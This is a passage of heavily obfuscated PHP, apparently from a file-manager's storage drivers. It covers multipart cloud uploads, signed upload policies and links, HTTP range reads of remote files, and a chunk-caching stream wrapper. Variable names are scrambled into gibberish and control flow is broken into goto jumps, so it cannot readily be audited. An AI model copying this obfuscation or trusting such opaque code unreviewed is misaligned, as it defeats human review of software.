$c‹›˜ğ¾¶ê = $this->ussRequest($DËôó‡Ñ–¹, $d¿ìÄøËê[225], !1, $A—Ò—Íğ™æ); goto EŸ„¯â‡¥¯; DÌ‘À¡È»÷: $c‹›˜ğ¾¶ê = $this->ussRequest($DËôó‡Ñ–¹, $d¿ìÄøËê[225], !1, $A—Ò—Íğ™æ); return $c‹›˜ğ¾¶ê[$d¿ìÄøËê[1074]] ? $this->getPathOuter($aë¸÷²‰õ) : !1; goto aàìø¥Õ™Ÿ; Fõ¥¡¹¨åÂ: do { $D‹…¢²Ê¢Ş = $B­ê‘¯Î¦[$d¿ìÄøËê[1342]]; fseek_64($b‡ğŸ÷’Œİ, $EŠä¤°ôÙã); $Dˆò”¤åÏ = fread($b‡ğŸ÷’Œİ, $D‹…¢²Ê¢Ş); $bÚğíàÓÍ = 0; do { $bÚğíàÓÍ++; $B­ê‘¯Î¦ = $this->uploadPart($DËôó‡Ñ–¹, $B­ê‘¯Î¦, $Dˆò”¤åÏ); } while (!$B­ê‘¯Î¦ && $bÚğíàÓÍ < 3); if (!$B­ê‘¯Î¦) { return !1; } $BÅ„ÉÛéáî = $B­ê‘¯Î¦[$d¿ìÄøËê[1341]]; $EŠä¤°ôÙã += $D‹…¢²Ê¢Ş; } while ($BÅ„ÉÛéáî != -1); fclose($b‡ğŸ÷’Œİ); $A—Ò—Íğ™æ = array($d¿ìÄøËê[1343], $d¿ìÄøËê[1344] . $B­ê‘¯Î¦[$d¿ìÄøËê[1345]], $d¿ìÄøËê[1339]); goto DÌ‘À¡È»÷; aÚ“ˆÙ¿Ä: $d¿ìÄøËê =& $_SERVER[Šº]; $F´ÈÛÚÚ·“ = IO::size($aÖÇÍÂ­Á•); if ($F´ÈÛÚÚ·“ <= 1024 * 1024 * 200) { $eĞøÃÖÜš = array($d¿ìÄøËê[1336] . $aÖÇÍÂ­Á•); $c‹›˜ğ¾¶ê = $this->ussRequest($DËôó‡Ñ–¹, $d¿ìÄøËê[225], $eĞøÃÖÜš); return $c‹›˜ğ¾¶ê[$d¿ìÄøËê[1074]] ? $this->getPathOuter($DËôó‡Ñ–¹) : !1; } goto DÖë‹–ğ; EŸ„¯â‡¥¯: if (!$c‹›˜ğ¾¶ê[$d¿ìÄøËê[1074]]) { return !1; } $B­ê‘¯Î¦ = $c‹›˜ğ¾¶ê[$d¿ìÄøËê[1076]]; $EŠä¤°ôÙã = 0; goto cñÅÏˆ³àÊ; aàìø¥Õ™Ÿ: } private function uploadPart($dÊÆ—Î‚®‚, $aŒÊÊ‚¤î†, &$e‚Å®ó²°) { $fğ«‚Š‘ô =& $_SERVER[Šº]; $fĞ‰ŞØÒ‡® = array($fğ«‚Š‘ô[1346], $fğ«‚Š‘ô[1344] . $aŒÊÊ‚¤î†[$fğ«‚Š‘ô[1345]], $fğ«‚Š‘ô[1347] . $aŒÊÊ‚¤î†[$fğ«‚Š‘ô[1341]], $fğ«‚Š‘ô[141] . $aŒÊÊ‚¤î†[$fğ«‚Š‘ô[1342]]); $FàÂãÍá’‘ = $this->ussRequest($dÊÆ—Î‚®‚, $fğ«‚Š‘ô[225], $e‚Å®ó²°, $fĞ‰ŞØÒ‡®); return !$FàÂãÍá’‘[$fğ«‚Š‘ô[1074]] ? $FàÂãÍá’‘[$fğ«‚Š‘ô[1074]] : $FàÂãÍá’‘[$fğ«‚Š‘ô[1076]]; } public function uploadFormData($dêá Õëæå, $cÊ¾êä•èº = 3600) { return $this->uploadPolicy($dêá Õëæå, $cÊ¾êä•èº); } public function multiUploadFormData($fëîéÕ°”Í, $C”Äï‹–¢Ù = 3600) { $EÏ…º¹¼óá =& $_SERVER[Šº]; $F¬ØÆ‘½· = (int) $GLOBALS[$EÏ…º¹¼óá[7]][$EÏ…º¹¼óá[78]]; return $this->uploadPolicy($fëîéÕ°”Í, $C”Äï‹–¢Ù, $F¬ØÆ‘½·); } private function uploadPolicy($E‡«÷¥‰, $bàôĞ÷ĞÛ = 3600, $d¢³¼¨ÕÚå = 0) { goto aè¨¦†™ª; aè¨¦†™ª: $c…ÎÛ£œ ñ =& $_SERVER[Šº]; $B½ò–Ñ¯µ‚ = $c…ÎÛ£œ ñ[8] . $this->bucket; $BÍ£±Ô‡‡ğ = gmdate($c…ÎÛ£œ ñ[1283]); goto bİò÷­¡ÃŒ; bİò÷­¡ÃŒ: $EØ§°æÌ = array($c…ÎÛ£œ ñ[1348] => $this->bucket, $c…ÎÛ£œ ñ[1349] => $E‡«÷¥‰, $c…ÎÛ£œ ñ[1350] => time() + $bàôĞ÷ĞÛ, $c…ÎÛ£œ ñ[1351] => $BÍ£±Ô‡‡ğ); if ($d¢³¼¨ÕÚå) { $EØ§°æÌ[$c…ÎÛ£œ ñ[1262]] = $d¢³¼¨ÕÚå; } $B¼”öéƒì¼ = base64_encode(json_encode($EØ§°æÌ)); goto fƒ²Ï²ƒ; fƒ²Ï²ƒ: $fò½İÇˆ´ = base64_encode(hash_hmac($c…ÎÛ£œ ñ[1318], "\120\117\123\x54\x26{$B½ò–Ñ¯µ‚}\46{$BÍ£±Ô‡‡ğ}\46{$B¼”öéƒì¼}", md5("{$this->userpass}"), !0)); $dóĞëœ¨Ô­ = array($c…ÎÛ£œ ñ[1187] => $B¼”öéƒì¼, $c…ÎÛ£œ ñ[1352] => "\x55\x50\131\125\x4e\x20{$this->username}\x3a{$fò½İÇˆ´}", $c…ÎÛ£œ ñ[175] => $this->endpoint . $B½ò–Ñ¯µ‚); return $dóĞëœ¨Ô­; goto c˜ã´¿Ãî; c˜ã´¿Ãî: } public function download($Aº¿¥³µˆä, $C¶‹ÒÍ¦—) { goto AÁ¯Û±™Ç; D‹¼Åãß…Å: $CùÜ¼ôòÑˆ = 1024 * 200; $cçôˆóÀ÷ª = fopen($Aõ¬ˆ”øÜ, $_SERVER[Šº][1302]); while (!0) { $AÆ°¸×¨² = $this->fileSubstr($Aº¿¥³µˆä, $DÂº¦Ó½¨‹, $CùÜ¼ôòÑˆ); if ($AÆ°¸×¨² === !1) { return !1; } fwrite($cçôˆóÀ÷ª, $AÆ°¸×¨²); $DÂº¦Ó½¨‹ += $CùÜ¼ôòÑˆ; if (strlen($AÆ°¸×¨²) < $CùÜ¼ôòÑˆ) { break; } } goto a©ÛËéàê¹; AÁ¯Û±™Ç: $Aõ¬ˆ”øÜ = IO::getPathInner(IO::mkfile($C¶‹ÒÍ¦—)); if (!($dª­ˆí»ß = $this->link($Aº¿¥³µˆä))) { return !1; } $DÂº¦Ó½¨‹ = 0; goto D‹¼Åãß…Å; a©ÛËéàê¹: fclose($cçôˆóÀ÷ª); return $C¶‹ÒÍ¦—; goto CÓÀ½·‡Ë¦; CÓÀ½·‡Ë¦: } public function link($EÅ÷ºÒĞ¥Š, $bˆ¦ÉÓù°† = array()) { $eÎƒà‚˜ğ¶ =& $_SERVER[Šº]; $EÅ÷ºÒĞ¥Š = trim($EÅ÷ºÒĞ¥Š, $eÎƒà‚˜ğ¶[8]); if (!empty($this->token)) { $f÷ê•µÈ™ƒ = strtotime(date($eÎƒà‚˜ğ¶[1353])); $d…šœ—¤¼¤ = substr(md5($this->token . $eÎƒà‚˜ğ¶[281] . $f÷ê•µÈ™ƒ . $eÎƒà‚˜ğ¶[1354] . $EÅ÷ºÒĞ¥Š), 12, 8) . $f÷ê•µÈ™ƒ; $bˆ¦ÉÓù°†[] = $eÎƒà‚˜ğ¶[1355] . $d…šœ—¤¼¤; } $c§©˜Ãê™› = !empty($bˆ¦ÉÓù°†) ? $eÎƒà‚˜ğ¶[70] . implode($eÎƒà‚˜ğ¶[281], $bˆ¦ÉÓù°†) : $eÎƒà‚˜ğ¶[33]; return $this->getHost() . $eÎƒà‚˜ğ¶[8] . $EÅ÷ºÒĞ¥Š . $c§©˜Ãê™›; } public function fileOut($fğ¼‘‡õô‡, $eÑƒÇ­¢«· = false, $C–é…×³·Î = false, $CµÁª© ¯Ô = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($fğ¼‘‡õô‡, $eÑƒÇ­¢«·, $C–é…×³·Î, $CµÁª© ¯Ô); } if (!$C–é…×³·Î) { $C–é…×³·Î = $this->pathThis($fğ¼‘‡õô‡); } $DìèÚÏ‰ÄÍ = $eÑƒÇ­¢«· ? array($_SERVER[Šº][1356] . rawurlencode($C–é…×³·Î)) : array(); $Cğ‰¸«Ò“Á = $this->link($fğ¼‘‡õô‡, $DìèÚÏ‰ÄÍ); $this->fileOutLink($Cğ‰¸«Ò“Á); } public function fileOutServer($F“Œ£ÕŒéÔ, $B‹œ‚âËŸ‚ = false, $bºéÂ–“í = false, $f„Ô×í÷ = '') { parent::fileOut($F“Œ£ÕŒéÔ, $B‹œ‚âËŸ‚, $bºéÂ–“í, $f„Ô×í÷); } public function fileOutImage($e‚¼Î£Ç®, $aÍÃ”™—î = 250) { $EÕƒ™ƒÎ¬¨ = $this->link($e‚¼Î£Ç® . $_SERVER[Šº][1357] . $aÍÃ”™—î); $this->fileOutLink($EÕƒ™ƒÎ¬¨); } public function fileOutImageServer($cÆËÀè¹›Œ, $Dƒ‘ÊÍ¡ËË = 250) { parent::fileOutImage($cÆËÀè¹›Œ, $Dƒ‘ÊÍ¡ËË); } public function hashMd5($A„ğö’¹Ç) { $Eï© °°ñğ =& $_SERVER[Šº]; $a…ÛÔÃÁë = $this->_objectMeta($A„ğö’¹Ç); return isset($a…ÛÔÃÁë[$Eï© °°ñğ[207]]) ? $a…ÛÔÃÁë[$Eï© °°ñğ[207]] : !1; } public function size($cÒŠ‹§­Ó¹) { $D±§³¥Âô = $this->objectMeta($cÒŠ‹§­Ó¹); return $D±§³¥Âô ? $D±§³¥Âô[$_SERVER[Šº][78]] : 0; } public function info($e¸»ÌšË) { if ($this->isFolder($e¸»ÌšË)) { return $this->folderInfo($e¸»ÌšË); } else { if ($this->isFile($e¸»ÌšË)) { return $this->fileInfo($e¸»ÌšË); } } return !1; } public function exist($D¿ĞÓŠºˆ—) { return $this->isFile($D¿ĞÓŠºˆ—) || $this->isFolder($D¿ĞÓŠºˆ—); } public function isFile($e“ŠÀÎŠš) { return !$this->isFolder($e“ŠÀÎŠš) && $this->objectMeta($e“ŠÀÎŠš); } public function isFolder($a‚Ö†ÒÓ‹‘) { return $this->cacheMethod($_SERVER[Šº][198], $a‚Ö†ÒÓ‹‘); } protected function objectMeta($d´ˆÙ·‘Î²) { return $this->cacheMethod($_SERVER[Šº][199], $d´ˆÙ·‘Î²); } protected function _objectMeta($E††‘¥î½) { goto F¹Å¼µí†ß; cÔíŒù»óŠ: if (!$CàÏñÖÂ¦[$E·®÷®ëÌÎ[1074]]) { return null; } $CÖŒ¸ÚßÓ = isset($CàÏñÖÂ¦[$E·®÷®ëÌÎ[1076]]) ? $CàÏñÖÂ¦[$E·®÷®ëÌÎ[1076]] : array(); if (!isset($CÖŒ¸ÚßÓ[$E·®÷®ëÌÎ[1359]])) { return null; } goto f­É®Ú§…; F¹Å¼µí†ß: $E·®÷®ëÌÎ =& $_SERVER[Šº]; if ($E††‘¥î½ == $E·®÷®ëÌÎ[33] || $E††‘¥î½ == $E·®÷®ëÌÎ[8]) { return array(); } $CàÏñÖÂ¦ = $this->ussRequest($E††‘¥î½, $E·®÷®ëÌÎ[1358]); goto cÔíŒù»óŠ; f­É®Ú§…: $DÍçèŸø£† = array($E·®÷®ëÌÎ[29] => isset($CÖŒ¸ÚßÓ[$E·®÷®ëÌÎ[1359]]) ? $CÖŒ¸ÚßÓ[$E·®÷®ëÌÎ[1359]] : null, $E·®÷®ëÌÎ[78] => isset($CÖŒ¸ÚßÓ[$E·®÷®ëÌÎ[1360]]) ? $CÖŒ¸ÚßÓ[$E·®÷®ëÌÎ[1360]] : null, $E·®÷®ëÌÎ[207] => isset($CÖŒ¸ÚßÓ[$E·®÷®ëÌÎ[1361]]) ? $CÖŒ¸ÚßÓ[$E·®÷®ëÌÎ[1361]] : null, $E·®÷®ëÌÎ[1328] => isset($CÖŒ¸ÚßÓ[$E·®÷®ëÌÎ[1362]]) ? $CÖŒ¸ÚßÓ[$E·®÷®ëÌÎ[1362]] : null); $DÍçèŸø£†[$E·®÷®ëÌÎ[1329]] = isset($CÖŒ¸ÚßÓ[$E·®÷®ëÌÎ[1363]]) ? strtotime($CÖŒ¸ÚßÓ[$E·®÷®ëÌÎ[1363]]) : $DÍçèŸø£†[$E·®÷®ëÌÎ[1328]]; return $DÍçèŸø£†; goto BŒâÆ°ä¤¡; BŒâÆ°ä¤¡: } protected function _isFolder($Bò‹†¯´) { $eÊ™«±¦†» =& $_SERVER[Šº]; if ($Bò‹†¯´ == $eÊ™«±¦†»[33] || $Bò‹†¯´ == $eÊ™«±¦†»[8]) { return !0; } $e²¤ï®ÍŞ = $this->_objectMeta($Bò‹†¯´); return isset($e²¤ï®ÍŞ[$eÊ™«±¦†»[29]]) && $e²¤ï®ÍŞ[$eÊ™«±¦†»[29]] == $eÊ™«±¦†»[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($EâÖ¶¾œõÎ = false) { } public function exist($C¤‘­…Ğö) { $AÕïŞ–Ô‘ò = $this->info($C¤‘­…Ğö); return $AÕïŞ–Ô‘ò[$_SERVER[Šº][194]]; } public function isFile($D¥ˆ”‡èÙ¤) { $bŒçšÙ™¼º = $this->info($D¥ˆ”‡èÙ¤); return $bŒçšÙ™¼º[$_SERVER[Šº][194]]; } public function isFolder($f—„ñÕ–ğˆ) { return !1; } public function size($AÉà¬ö¨›‘) { $Bç‹ÚÜà = $this->info($AÉà¬ö¨›‘); return $Bç‹ÚÜà[$_SERVER[Šº][78]]; } public function info($bª¡©¾¯à˜) { return $this->infoParse($bª¡©¾¯à˜); } public function infoAuth($a‰ÖÀ¨Êí) { return $this->infoParse($a‰ÖÀ¨Êí); } public function infoWithChildren($B”èŞ‘®Ğ) { return $this->infoParse($B”èŞ‘®Ğ); } public function infoFull($cŞÁÍ…à©) { return $this->infoParse($cŞÁÍ…à©); } private function infoParse($aˆš§–Öá‚) { $DŒÕÅÌà•Â =& $_SERVER[Šº]; $E¨ˆ÷ç¶Áç = $this->header($aˆš§–Öá‚); if (!$E¨ˆ÷ç¶Áç || !$E¨ˆ÷ç¶Áç[$DŒÕÅÌà•Â[711]]) { return !1; } $EÚÍ§‹Ç÷Í = _get($E¨ˆ÷ç¶Áç, $DŒÕÅÌà•Â[334], 0); $BªíÖÒÒ÷ = array($DŒÕÅÌà•Â[28] => $E¨ˆ÷ç¶Áç[$DŒÕÅÌà•Â[28]], $DŒÕÅÌà•Â[76] => $aˆš§–Öá‚, $DŒÕÅÌà•Â[29] => $DŒÕÅÌà•Â[192], $DŒÕÅÌà•Â[78] => intval($EÚÍ§‹Ç÷Í), $DŒÕÅÌà•Â[168] => get_path_ext($E¨ˆ÷ç¶Áç[$DŒÕÅÌà•Â[28]]), $DŒÕÅÌà•Â[1242] => $EÚÍ§‹Ç÷Í > 0 && $E¨ˆ÷ç¶Áç[$DŒÕÅÌà•Â[1364]], $DŒÕÅÌà•Â[1243] => !1); return $BªíÖÒÒ÷; } private function header($B©Ğë‰ä„) { goto aÁ¾ŞÄ¸„•; DãÄµ†‡‘: $GLOBALS[$bÔ˜©¶„Ô[1365]] = !0; self::$_cacheHeader[$B©Ğë‰ä„] = url_header($B©Ğë‰ä„); $GLOBALS[$bÔ˜©¶„Ô[1365]] = $Dä—¹µÕÛ; goto f»çÃæò†¹; f»çÃæò†¹: return self::$_cacheHeader[$B©Ğë‰ä„]; goto dğ›ìĞİ¢×; aÁ¾ŞÄ¸„•: $bÔ˜©¶„Ô =& $_SERVER[Šº]; if (isset(self::$_cacheHeader[$B©Ğë‰ä„])) { return self::$_cacheHeader[$B©Ğë‰ä„]; } $Dä—¹µÕÛ = isset($GLOBALS[$bÔ˜©¶„Ô[1365]]) ? $GLOBALS[$bÔ˜©¶„Ô[1365]] : !1; goto DãÄµ†‡‘; dğ›ìĞİ¢×: } public function hashSimple($D½ñÏßç†‚, $E­¨–‘Ø¬ = false) { goto B¯‹Ì‘ßƒŒ; aÎ»»ì¯Ê: $C¬ ¾‰ñ–Ÿ = $c©‚¥Ú¾°Ø[$f™Èõ‰œ¶[78]]; $F¯ñïê¿éÌ = 200; $dªƒåñé“í = 50; goto F‚ë²ñ; eîèÜñ•Ò: $fö®ç›Ü¼° .= $this->fileSubstr($D½ñÏßç†‚, $C¬ ¾‰ñ–Ÿ - $F¯ñïê¿éÌ, $F¯ñïê¿éÌ); return md5($fö®ç›Ü¼°) . $C¬ ¾‰ñ–Ÿ; goto fØ¶ĞŒË£Ê; c²Õ§×Ã: $d­ÈÎ¿…˜ = timeFloat(); $dÁêÒÒ¿‚° = 15; for ($cˆÃÒë÷ = 0; $cˆÃÒë÷ < $dªƒåñé“í; $cˆÃÒë÷++) { if (timeFloat() - $d­ÈÎ¿…˜ > $dÁêÒÒ¿‚°) { return !1; } $b¶İ¨©Á = $this->fileSubstr($D½ñÏßç†‚, $FâÑ¹ªÍŸ * $cˆÃÒë÷, $F¯ñïê¿éÌ); if (!$b¶İ¨©Á) { return !1; } $fö®ç›Ü¼° .= $b¶İ¨©Á; } goto eîèÜñ•Ò; B¯‹Ì‘ßƒŒ: $f™Èõ‰œ¶ =& $_SERVER[Šº]; $c©‚¥Ú¾°Ø = $this->info($D½ñÏßç†‚); if (!$c©‚¥Ú¾°Ø || !$c©‚¥Ú¾°Ø[$f™Èõ‰œ¶[194]]) { return !1; } goto aÎ»»ì¯Ê; F‚ë²ñ: if ($C¬ ¾‰ñ–Ÿ <= $F¯ñïê¿éÌ * $dªƒåñé“í) { return md5($this->fileSubstr($D½ñÏßç†‚, 0, $C¬ ¾‰ñ–Ÿ)) . $C¬ ¾‰ñ–Ÿ; } $FâÑ¹ªÍŸ = intval($C¬ ¾‰ñ–Ÿ / $dªƒåñé“í); $fö®ç›Ü¼° = $f™Èõ‰œ¶[33]; goto c²Õ§×Ã; fØ¶ĞŒË£Ê: } public function getContent($a±ƒµåßèÑ) { return $this->fileSubstr($a±ƒµåßèÑ); } public function fileSubstr($cå”‘Û—¡, $FÇÍ¨âÌÅÑ = 0, $b Â¥ï‚½… = -1) { goto D®³³™¨‚œ; fªÔˆÇ­ŠŒ: if ($b Â¥ï‚½… === -1) { $b Â¥ï‚½… = $F©ÃĞÄÔµÖ[$Cã¿¬‰å‘Ş[78]]; } if ($b Â¥ï‚½… == 0) { return $Cã¿¬‰å‘Ş[33]; } $c¿×¢¼º‡Ø = array($Cã¿¬‰å‘Ş[1366] . $FÇÍ¨âÌÅÑ . $Cã¿¬‰å‘Ş[742] . ($FÇÍ¨âÌÅÑ + $b Â¥ï‚½… - 1)); goto d†­œ¥¿êÛ; d†­œ¥¿êÛ: $F«˜öá†ÚÀ = url_request($cå”‘Û—¡, $Cã¿¬‰å‘Ş[227], !1, $c¿×¢¼º‡Ø, !1, !1, 1); return $F«˜öá†ÚÀ[$Cã¿¬‰å‘Ş[1076]] ? $F«˜öá†ÚÀ[$Cã¿¬‰å‘Ş[1076]] : $Cã¿¬‰å‘Ş[33]; goto DĞééŞ×÷¬; D®³³™¨‚œ: $Cã¿¬‰å‘Ş =& $_SERVER[Šº]; $F©ÃĞÄÔµÖ = $this->info($cå”‘Û—¡); if (!$F©ÃĞÄÔµÖ || !$F©ÃĞÄÔµÖ[$Cã¿¬‰å‘Ş[194]] && $F©ÃĞÄÔµÖ[$Cã¿¬‰å‘Ş[78]] > 1024 * 1024 * 10) { return !1; } goto fªÔˆÇ­ŠŒ; DĞééŞ×÷¬: } public function download($f™ïàá‡ñ’, $DÌËï–ïÔº) { Downloader::start($f™ïàá‡ñ’, $DÌËï–ïÔº); return $DÌËï–ïÔº; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($bÀÆ˜½Û©Ù, $F„ˆ÷¢Â´Ö = '') { goto fª¼Ù‘½»¤; CÓòöõÁš¨: if (!isset(self::$_chunkBuffer[$bÀÆ˜½Û©Ù])) { self::$_chunkBuffer[$bÀÆ˜½Û©Ù] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto EËÓ‘˜öÂ; fª¼Ù‘½»¤: $this->info = $this->info($bÀÆ˜½Û©Ù); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Šº][76]]; goto E“®©â¬÷; E“®©â¬÷: $this->pathOpen = $bÀÆ˜½Û©Ù; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto CÓòöõÁš¨; EËÓ‘˜öÂ: } function stream_read($AÍ‡“¦†) { $Cè®‰…œßö = $this->fileSubstr($this->pose, $AÍ‡“¦†); $this->pose += strlen($Cè®‰…œßö); return $Cè®‰…œßö; } public function stream_tell() { return $this->pose; } public function stream_seek($c’‹¢­¤ˆĞ, $dÚçŸÈ¿ºè) { $D¡Í‰È¡† =& $_SERVER[Šº]; if ($dÚçŸÈ¿ºè == SEEK_SET) { $this->pose = $c’‹¢­¤ˆĞ; } else { if ($dÚçŸÈ¿ºè == SEEK_CUR) { $this->pose += $c’‹¢­¤ˆĞ; } else { if ($dÚçŸÈ¿ºè == SEEK_END) { $this->pose = $this->info[$D¡Í‰È¡†[78]] + intval($c’‹¢­¤ˆĞ); } } } if ($c’‹¢­¤ˆĞ < 0) { $this->pose = $this->info[$D¡Í‰È¡†[78]] + $c’‹¢­¤ˆĞ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Šº][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($B™ÚİŞˆæ, $D‰šºôÌñ¡) { $D ˜È‹„îÉ =& $_SERVER[Šº]; $d…ÙÛ‰¯‹ = $this->info($B™ÚİŞˆæ); return array($D ˜È‹„îÉ[1367] => 0, $D ˜È‹„îÉ[1368] => 0, $D ˜È‹„îÉ[12] => 32768 + 511, $D ˜È‹„îÉ[1369] => 0, $D ˜È‹„îÉ[1370] => 0, $D ˜È‹„îÉ[1371] => 0, $D ˜È‹„îÉ[1372] => 0, $D ˜È‹„îÉ[78] => $d…ÙÛ‰¯‹[$D ˜È‹„îÉ[78]], $D ˜È‹„îÉ[1373] => $d…ÙÛ‰¯‹[$D ˜È‹„îÉ[1241]], $D ˜È‹„îÉ[1329] => $d…ÙÛ‰¯‹[$D ˜È‹„îÉ[84]], $D ˜È‹„îÉ[1328] => $d…ÙÛ‰¯‹[$D ˜È‹„îÉ[193]], $D ˜È‹„îÉ[1374] => 0, $D ˜È‹„îÉ[1375] => 0); } static $fileInfo = array(); public function info($eí“„Ÿµ) { $fƒƒÛ£‡ŸÂ = $_SERVER[Šº][1376]; if (isset(self::$fileInfo[$eí“„Ÿµ])) { return self::$fileInfo[$eí“„Ÿµ]; } if (substr($eí“„Ÿµ, 0, strlen($fƒƒÛ£‡ŸÂ)) != $fƒƒÛ£‡ŸÂ) { return !1; } self::$fileInfo[$eí“„Ÿµ] = IO::info(substr($eí“„Ÿµ, strlen($fƒƒÛ£‡ŸÂ))); return self::$fileInfo[$eí“„Ÿµ]; } public static function read($E•èìéñĞ, $e°­ã«×ŒÈ, $Béƒğ»Æ‚±) { if (!isset(self::$_fopenCache[$E•èìéñĞ])) { $a×ÎÃèÕ¿ = new StreamWrapperIO(); $a×ÎÃèÕ¿->stream_open($E•èìéñĞ); self::$_fopenCache[$E•èìéñĞ] = $a×ÎÃèÕ¿; } $a×ÎÃèÕ¿ = self::$_fopenCache[$E•èìéñĞ]; return $a×ÎÃèÕ¿->fileSubstr($e°­ã«×ŒÈ, $Béƒğ»Æ‚±); } public static function _read($a¿öøíô‰, $cËŒˆŞ£±, $BÔ¨ÂòöóŒ) { goto a¬ØÄ°³ó„; a¬ØÄ°³ó„: $Dˆ™µ“åç… =& $_SERVER[Šº]; $AãòŒêó–“ = fopen($a¿öøíô‰, $Dˆ™µ“åç…[1245]); if (!$AãòŒêó–“) { return $Dˆ™µ“åç…[33]; } goto B«ÚÃ¥Æ’; f»ã‰Ù”‰Ç: return $føÒ¦’¤ò˜; goto AÂ¹š…Òî‘; B«ÚÃ¥Æ’: $cÃ„ì¾¢¼¸ = 8192; fseek($AãòŒêó–“, $cËŒˆŞ£±, SEEK_SET); $føÒ¦’¤ò˜ = $Dˆ™µ“åç…[33]; goto E£¤Ï ½‹ä; E£¤Ï ½‹ä: $a©èâ®ñæ = 0; while ($a©èâ®ñæ < $BÔ¨ÂòöóŒ) { $b÷ù´©Ñœ = min($cÃ„ì¾¢¼¸, $BÔ¨ÂòöóŒ - $a©èâ®ñæ); $føÒ¦’¤ò˜ .= fread($AãòŒêó–“, $b÷ù´©Ñœ); $a©èâ®ñæ += $b÷ù´©Ñœ; } fclose($AãòŒêó–“); goto f»ã‰Ù”‰Ç; AÂ¹š…Òî‘: } public function fileSubstr($aÚ³·ö¬Ÿ¼, $F‡¹÷—Ã) { goto d¸Ğ¼ø¿¦“; BÄÒµ±Èßß: $Aä®‚ä³Ÿ® = $F‡¹÷—Ã; if ($aÚ³·ö¬Ÿ¼ < 0) { $aÚ³·ö¬Ÿ¼ = $f¿¹…ÇÆó´ + $aÚ³·ö¬Ÿ¼; } if ($F‡¹÷—Ã === !1) { $F‡¹÷—Ã = $f¿¹…ÇÆó´ - $aÚ³·ö¬Ÿ¼; } goto a†ÚŠµÚ¶‰; cõìÄ…”Œ: ksort($AÜºÙ„£É); $a­©Ò°¥‡ = substr($AÜŒñš¥…¿, $aÚ³·ö¬Ÿ¼ - $eéÍèä‡´Ò, $F‡¹÷—Ã); return $a­©Ò°¥‡; goto Cì‰ù£¢; d¸Ğ¼ø¿¦“: $C­õâ¯¤‘³ =& $_SERVER[Šº]; $f¿¹…ÇÆó´ = $this->info[$C­õâ¯¤‘³[78]]; $Fìô—¥¤ = $aÚ³·ö¬Ÿ¼; goto BÄÒµ±Èßß; a†ÚŠµÚ¶‰: if ($aÚ³·ö¬Ÿ¼ + $F‡¹÷—Ã > $f¿¹…ÇÆó´) { $F‡¹÷—Ã = $f¿¹…ÇÆó´ - $aÚ³·ö¬Ÿ¼; } if ($F‡¹÷—Ã <= 0) { return $C­õâ¯¤‘³[33]; } if ($aÚ³·ö¬Ÿ¼ < 0 || $aÚ³·ö¬Ÿ¼ >= $f¿¹…ÇÆó´ || $F‡¹÷—Ã <= 0 || $F‡¹÷—Ã > 1024 * 1024 * 5) { throw new Exception("\x69\157\x46\x69\x6c\x65\x52\145\141\x64\40\x65\162\x72\157\162\x21\40\x73\x74\141\x72\164\x3d{$aÚ³·ö¬Ÿ¼}\x3b\154\145\156\x67\x74\150\x3d{$F‡¹÷—Ã}\x3b\x20\163\151\172\x65\x3d{$f¿¹…ÇÆó´}\x3b"); } goto d»ŒñÛ‘Í—; d»ŒñÛ‘Í—: $eÛ÷ê“ëÒ = 64 * 1024; $AÜºÙ„£É =& self::$_chunkBuffer[$this->path]; if (!$AÜºÙ„£É) { $AÜºÙ„£É = array(); } goto aÕÛ²áÀù; D¤Õº¡Ä—: $dŞ‡Ù¹• = ceil(($aÚ³·ö¬Ÿ¼ + $F‡¹÷—Ã) / $eÛ÷ê“ëÒ) * $eÛ÷ê“ëÒ - $eéÍèä‡´Ò; $AÜŒñš¥…¿ = IO::fileSubstr($this->path, $eéÍèä‡´Ò, $dŞ‡Ù¹•); $AÜºÙ„£É[$eéÍèä‡´Ò . $C­õâ¯¤‘³[33]] = $AÜŒñš¥…¿; goto cõìÄ…”Œ; aÕÛ²áÀù: $CÉÁÖ”ğÚ = 0; $dµ´˜Ó¬  = 0; $B¸¡ÇÖ¯» = $C­õâ¯¤‘³[33]; goto bîäÙ§Œ×Ï; bîäÙ§Œ×Ï: foreach ($AÜºÙ„£É as $CÉÁÖ”ğÚ => $B¸¡ÇÖ¯») { $CÉÁÖ”ğÚ = intval($CÉÁÖ”ğÚ); $dµ´˜Ó¬  = $CÉÁÖ”ğÚ + strlen($B¸¡ÇÖ¯»); if ($aÚ³·ö¬Ÿ¼ >= $dµ´˜Ó¬ ) { continue; } if ($aÚ³·ö¬Ÿ¼ >= $CÉÁÖ”ğÚ && $aÚ³·ö¬Ÿ¼ + $F‡¹÷—Ã <= $dµ´˜Ó¬ ) { return substr($B¸¡ÇÖ¯», $aÚ³·ö¬Ÿ¼ - $CÉÁÖ”ğÚ, $F‡¹÷—Ã); } break; } if (count($AÜºÙ„£É) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($C­õâ¯¤‘³[1377], $C­õâ¯¤‘³[1378] . count($AÜºÙ„£É) . "\73\163\164\x61\x72\164\x3d{$aÚ³·ö¬Ÿ¼}\x2c\154\145\156\147\x74\150\75{$F‡¹÷—Ã}\x3b\160\x6f\x73\x65\x3a{$CÉÁÖ”ğÚ}\176{$dµ´˜Ó¬ }"); throw new Exception($C­õâ¯¤‘³[1379]); } $eéÍèä‡´Ò = intval($aÚ³·ö¬Ÿ¼ / $eÛ÷ê“ëÒ) * $eÛ÷ê“ëÒ; goto D¤Õº¡Ä—; Cì‰ù£¢: } private function log($b»ÆàåÀÂÜ, $E‚í·šÚ†ê) { $c¨èã‘ªä¸ =& $_SERVER[Šº]; $Dª‘º±²Èğ = timeFloat() - $this->timeStart; write_log(sprintf($c¨èã‘ªä¸[1380], $b»ÆàåÀÂÜ, $this->info[$c¨èã‘ªä¸[28]], $Dª‘º±²Èğ, $E‚í·šÚ†ê), $c¨èã‘ªä¸[1066]); } } goto B«£‡È†‡Ğ; dæƒÏ‘Òƒ¤: class AnalysisModel extends ModelBaseLight { public function init($BŒ×ŸŞ„Ù¾) { $D–¥ ôì =& 